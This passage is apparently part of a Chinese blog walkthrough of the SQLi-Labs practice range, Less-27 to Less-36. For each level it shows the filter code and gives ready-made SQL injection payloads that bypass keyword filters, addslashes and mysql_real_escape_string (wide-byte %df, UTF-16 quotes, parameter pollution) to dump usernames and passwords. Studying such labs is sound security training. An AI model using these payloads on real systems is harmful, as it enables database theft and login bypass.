相比，只是拼接方式改变了，因为没有输出报错信息，所以不能使用报错注入了，然后不再啰嗦，大家可以自行测试。</p><h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>过滤规则又增加了许多：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤了 /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);</span><br><span class="line"><span class="comment"># 过滤了 -</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);</span><br><span class="line"><span class="comment"># 过滤了 #</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);</span><br><span class="line"><span class="comment"># 过滤了空格</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);</span><br><span class="line"><span class="comment"># 过滤了 select /m 严格模式 不可以使用双写绕过</span></span><br><span class="line">$id= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, $id);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤了 union UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, $id);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br></pre></td></tr></table></figure><p>union 和 select 没有忽略大小写 导致写了很多冗杂的规则，但还是可以轻易绕过。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 大小写混写</span></span><br><span class="line">unioN</span><br><span class="line">unIon</span><br><span class="line">seLect</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 嵌套双写</span></span><br><span class="line">uunionnion</span><br><span class="line">sselectelect</span><br><span class="line">ununionion</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>很多种方案，不再赘述，下面直接丢 payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=100&apos;%0bununionion%0bseLect%0b1,(seLect(@x)FROM(seLect(@x:=0x00) ,(seLect(@x)FROM(users)WHERE(@x)IN(@x:=CONCAT(0x20,@x,username,password,0x3c62723e))))x),3%0band%0b&apos;1</span><br></pre></td></tr></table></figure><h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-27 相比，只是拼接方式发生了改变，又因为没有报错日志的输出，所以少了报错注入的利用方式，利用方式换汤不换药，这里不做演示了。</p><h3 id="Less-28"><a href="#Less-28" class="headerlink" title="Less-28"></a>Less-28</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>过滤规则如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 过滤 /*</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, $id);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤 - # 注释</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, $id);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤 空格 +</span></span><br><span class="line">$id= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, $id);.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤 union select /i 大小写都过滤</span></span><br><span class="line">$id= preg_replace(<span class="string">'/union\s+select/i'</span>,<span class="string">""</span>, $id);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br></pre></td></tr></table></figure><p>这里 union 和 select 这里可以使用双写嵌套绕过，过滤了注释的话 就使用闭合绕过，过滤了空格使用 Less-26 的编码绕过，OK分析完成后直接放完整的 payload 吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=100&apos;)%0bunion%a0select%0b1,(SELECT%0bGROUP_CONCAT(username,password%0bSEPARATOR%0b0x3c62723e)%0bFROM%0busers),3%a0and%0b(&apos;1</span><br></pre></td></tr></table></figure><h3 id="Less-28a"><a href="#Less-28a" class="headerlink" title="Less-28a"></a>Less-28a</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>比 Less-27 还少了几个过滤规则，这样直接丢 payload 吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos;) union%a0select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+</span><br></pre></td></tr></table></figure><h3 id="Less-29"><a href="#Less-29" class="headerlink" title="Less-29"></a>Less-29</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=(&#39;$id&#39;)</code></td></tr></tbody></table><p>这一题和注入天书里面描述的环境不太一样，还是具体分析看下代码吧。</p><ul><li><code>index.php</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id = 'x' 的拼接方式</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 查询到结果:</span><br><span class="line">    输出查询的详细信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br></pre></td></tr></table></figure><p>从源码来看的话和前面的貌似没有啥区别，直接尝试联合注入看看吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=-1&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users) --+</span><br></pre></td></tr></table></figure><p>这个 index.php 太简单了，不知道啥意思，下面直接重点来看 login.php 吧：</p><ul><li><code>login.php</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询 query 的字符串</span></span><br><span class="line">$qs = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟 tomcat 的查询函数 处理一下</span></span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 再次过滤检测</span></span><br><span class="line">whitelist($id1);</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 查询到结果:</span><br><span class="line">    输出查询的详细信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span><span class="params">($query_string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $q_s = $query_string;</span><br><span class="line">    <span class="comment"># &amp; 作为分隔符 分割字符串</span></span><br><span class="line">    $qs_array= explode(<span class="string">"&amp;"</span>,$q_s);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历 qs_array 数组</span></span><br><span class="line">    <span class="keyword">foreach</span>($qs_array <span class="keyword">as</span> $key =&gt; $value)</span><br><span class="line">    &#123;</span><br><span class="line">        $val=substr($value,<span class="number">0</span>,<span class="number">2</span>);</span><br><span class="line">        <span class="comment"># 如果数组前两位是 id 的话</span></span><br><span class="line">        <span class="keyword">if</span>($val==<span class="string">"id"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment"># 截取 $value 的3-30 的字符串 作为 id 的值</span></span><br><span class="line">            $id_value=substr($value,<span class="number">3</span>,<span class="number">30</span>);</span><br><span class="line">            <span class="keyword">return</span> $id_value;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span><span class="params">($input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment"># 过滤规则 检测数字</span></span><br><span class="line">    $match = preg_match(<span class="string">"/^\d+$/"</span>, $input);</span><br><span class="line">    <span class="keyword">if</span> 不符合规则：</span><br><span class="line">        header(<span class="string">'Location: hacked.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码中还是很容易发现问题的，关键问题出在下面的地方：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">...</span><br><span class="line">whitelist($id1);</span><br><span class="line">whitelist` 过滤是比较严格的，如果 id 不是数字的话就会直接重定向到 `hacked.php`，这里是没毛病的。那么问题出在了这里函数`$id1=java_implimentation($qs);</span><br></pre></td></tr></table></figure><p>因为 return 表示了函数的结束运行，所以这个函数捕捉到 id 的时候就会返回 <code>return $id_value</code>，这样就导致了 用户加入构造两组 id 的话，那么后面的 id 就会绕过函数检测。</p><p>假设用户输入这样的语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=<span class="number">1</span>&amp;id=<span class="number">2</span></span><br></pre></td></tr></table></figure><p>Apache PHP 会解析最后一个参数</p><p>Tomcat JSP 会解析第一个参数</p><p>知道这个原理的话后面尝试直接注入吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login.php?id=1&amp;id=-2&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure><h3 id="Less-30"><a href="#Less-30" class="headerlink" title="Less-30"></a>Less-30</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&quot;$id&quot;</code></td></tr></tbody></table><p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p><h3 id="Less-31"><a href="#Less-31" class="headerlink" title="Less-31"></a>Less-31</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=（&quot;$id&quot;）</code></td></tr></tbody></table><p>和 Less-29 相比没有啥本质变化，只是拼接方式不一样。</p><h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>考察 Bypass addslashes()，关键的防护代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">$id=check_addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在' " \ 等敏感字符前面添加反斜杠</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;        <span class="comment"># \ 转换为 \\</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/'</span>. preg_quote(<span class="string">'\\'</span>) .<span class="string">'/'</span>, <span class="string">"\\\\\\"</span>, $string);          将       <span class="comment"># 将 ' 转为\"</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\'/i'</span>, <span class="string">'\\\''</span>, $string);</span><br><span class="line">      <span class="comment"># 将 " 转为\"</span></span><br><span class="line">    $string = preg_replace(<span class="string">'/\"/'</span>, <span class="string">"\\\""</span>, $string);</span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>宽字节注入原理</strong></p><p>MySQL 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如 <code>%aa%5c</code> 就是一个 汉字。因为过滤方法主要就是在敏感字符前面添加 反斜杠 <code>\</code>，所以这里想办法干掉反斜杠即可。</p><ol><li><code>%df</code> 吃掉 <code>\</code></li></ol><p>具体的原因是 <code>urlencode(\&#39;) = %5c%27</code>，我们在<code>%5c%27</code> 前面添加<code>%df</code>，形 成<code>%df%5c%27</code>，MySQL 在 GBK 编码方式的时候会将两个字节当做一个汉字，这个时候就把<code>%df%5c</code> 当做是一个汉字，<code>%27</code> 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p><ol><li>将 <code>\&#39;</code> 中的 <code>\</code> 过滤掉</li></ol><p>例如可以构造 <code>%5c%5c%27</code> 的情况，后面的<code>%5c</code>会被前面的<code>%5c</code> 给注释掉。这也是 bypass 的一种方法。</p><p>本关卡采用第一种 %df 宽字节注入来吃掉反斜杠，下面直接丢 payload 吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+users)--+</span><br></pre></td></tr></table></figure><h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>拼接方式也是一样的，过滤方法细节有点变化，具体如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= addslashes($string);</span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>addslashes()</code> 函数返回在预定义字符之前添加反斜杠的字符串。</p><table><thead><tr><th>预定义字符</th><th style="text-align:left">转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td style="text-align:left"><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td style="text-align:left"><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td style="text-align:left"><code>\&quot;</code></td></tr></tbody></table><p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串，和 Less-32 的函数功能是差不的，依旧可以使用宽字节进行注入。</p><blockquote><p>注入天书：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御此漏洞</p></blockquote><h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>POST</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>username=&#39;$uname&#39;</code></td></tr></tbody></table><p>过滤方法依然和 Less-33 一致：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = addslashes($uname1);</span><br><span class="line">$passwd= addslashes($passwd1);</span><br></pre></td></tr></table></figure><p>只是由 GET 型变成了 POST 型，所以下面直接丢 POST 的数据包 payload 了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%df&apos; union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd=233</span><br></pre></td></tr></table></figure><p>MySQL 注入天书这里介绍了一个新的方法</p><p>将 utf-8 转换为 utf-16 或 utf-32，例如将 <code>&#39;</code> 转为 utf-16 为<code>�</code></p><p>我们就 可以利用这个方式进行尝试，可以使用 Linux 自带的 iconv 命令进行 UTF 的编码转换：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ <span class="built_in">echo</span> \<span class="string">'|iconv -f utf-8 -t utf-16</span></span><br><span class="line"><span class="string">��'</span></span><br><span class="line">➜  ~ <span class="built_in">echo</span> \<span class="string">'|iconv -f utf-8 -t utf-32</span></span><br><span class="line"><span class="string">��'</span></span><br></pre></td></tr></table></figure><p>首先尝试一个经典的万能密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=�&apos; or 1#&amp;passwd=</span><br></pre></td></tr></table></figure><p>为什么这个万能密码可以生效呢，因为拼接到 SQL 中是如下的效果：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">'�'</span> <span class="keyword">or</span> <span class="number">1</span><span class="comment">#and password='$passwd' LIMIT 0,1</span></span><br></pre></td></tr></table></figure><p><code>or 1</code> 是一个永真的条件，不论 select 选择出的内容是什么。<code>or 1</code> 之后时钟都是 1，下面是控制后台的演示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># where username = 'x' or 1</span></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> username = <span class="string">'x'</span> or 1;</span><br><span class="line">+----+---------------+------------+</span><br><span class="line">| id | username      | password   |</span><br><span class="line">+----+---------------+------------+</span><br><span class="line">|  1 | Dumb          | Dumb       |</span><br><span class="line">|  2 | Angelina      | I-kill-you |</span><br><span class="line">|  3 | Dummy         | p@ssword   |</span><br><span class="line">|  4 | secure        | crappy     |</span><br><span class="line">|  5 | stupid        | stupidity  |</span><br><span class="line">|  6 | superman      | genious    |</span><br><span class="line">|  7 | batman        | mob!le     |</span><br><span class="line">|  8 | admin         | 233        |</span><br><span class="line">|  9 | admin1        | admin1     |</span><br><span class="line">| 10 | admin2        | admin2     |</span><br><span class="line">| 11 | admin3        | admin3     |</span><br><span class="line">| 12 | dhakkan       | dumbo      |</span><br><span class="line">| 14 | admin4        | admin4     |</span><br><span class="line">| 21 | admin<span class="string">'#hacker | 111        |</span></span><br><span class="line"><span class="string">+----+---------------+------------+</span></span><br><span class="line"><span class="string">14 rows in set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># where username = '</span>x<span class="string">' or 0</span></span><br><span class="line"><span class="string">mysql&gt; select * from users where username = '</span>x<span class="string">' or 0;</span></span><br><span class="line"><span class="string">Empty set (0.00 sec)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># where 1</span></span><br><span class="line"><span class="string">mysql&gt; select * from users where 1;</span></span><br><span class="line"><span class="string">+----+---------------+------------+</span></span><br><span class="line"><span class="string">| id | username      | password   |</span></span><br><span class="line"><span class="string">+----+---------------+------------+</span></span><br><span class="line"><span class="string">|  1 | Dumb          | Dumb       |</span></span><br><span class="line"><span class="string">|  2 | Angelina      | I-kill-you |</span></span><br><span class="line"><span class="string">|  3 | Dummy         | p@ssword   |</span></span><br><span class="line"><span class="string">|  4 | secure        | crappy     |</span></span><br><span class="line"><span class="string">|  5 | stupid        | stupidity  |</span></span><br><span class="line"><span class="string">|  6 | superman      | genious    |</span></span><br><span class="line"><span class="string">|  7 | batman        | mob!le     |</span></span><br><span class="line"><span class="string">|  8 | admin         | 233        |</span></span><br><span class="line"><span class="string">|  9 | admin1        | admin1     |</span></span><br><span class="line"><span class="string">| 10 | admin2        | admin2     |</span></span><br><span class="line"><span class="string">| 11 | admin3        | admin3     |</span></span><br><span class="line"><span class="string">| 12 | dhakkan       | dumbo      |</span></span><br><span class="line"><span class="string">| 14 | admin4        | admin4     |</span></span><br><span class="line"><span class="string">| 21 | admin'</span><span class="comment">#hacker | 111        |</span></span><br><span class="line">+----+---------------+------------+</span><br><span class="line">14 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="comment"># where 0</span></span><br><span class="line">mysql&gt; select * from users <span class="built_in">where</span> 0;</span><br><span class="line">Empty <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p>那么直接尝试一下最基本的联合查询注入看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=�&apos; and 1=2 union select 1,(SELECT GROUP_CONCAT(username,password SEPARATOR 0x3c62723e) FROM users)#&amp;passwd=</span><br></pre></td></tr></table></figure><p>也是 OK 的</p><h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=$id</code></td></tr></tbody></table><p>Less-35 的防护措施有点搞笑，首先 id 使用了如下规则过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$id=check_addslashes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string = addslashes($string);</span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是本关的拼接方式是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM users WHERE id=<span class="variable">$id</span> LIMIT 0,1"</span>;</span><br></pre></td></tr></table></figure><p>实际进行注入利用的时候并不需要写单引号，那么就尝试直接注入看看吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+</span><br></pre></td></tr></table></figure><h3 id="Less-36"><a href="#Less-36" class="headerlink" title="Less-36"></a>Less-36</h3><table><thead><tr><th>请求方式</th><th>注入类型</th><th>拼接方式</th></tr></thead><tbody><tr><td>GET</td><td>联合、报错、布尔盲注、延时盲注</td><td><code>id=&#39;$id&#39;</code></td></tr></tbody></table><p>主要防护代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$id=check_quotes($_GET[<span class="string">'id'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span><span class="params">($string)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $string= mysql_real_escape_string($string);</span><br><span class="line">    <span class="keyword">return</span> $string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一关主要考查了 Bypass MySQL Real Escape String，mysql_real_escape_string 会检测并转义如下危险字符：</p><table><thead><tr><th>危险字符</th><th>转义后</th></tr></thead><tbody><tr><td><code>\</code></td><td><code>\\</code></td></tr><tr><td><code>&#39;</code></td><td><code>\&#39;</code></td></tr><tr><td><code>&quot;</code></td><td><code>\&quot;</code></td></tr></tbody></table><p>这一关使用 Less-34 关的两种思路依然是可行的，下面直接尝试 payload 进行注入吧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1%df&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) --+</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1�&apos; union select 1,2,(SELECT+GROUP_CONCAT(username,password+SEPARATOR+0x3c62723e)+FROM+security.users) 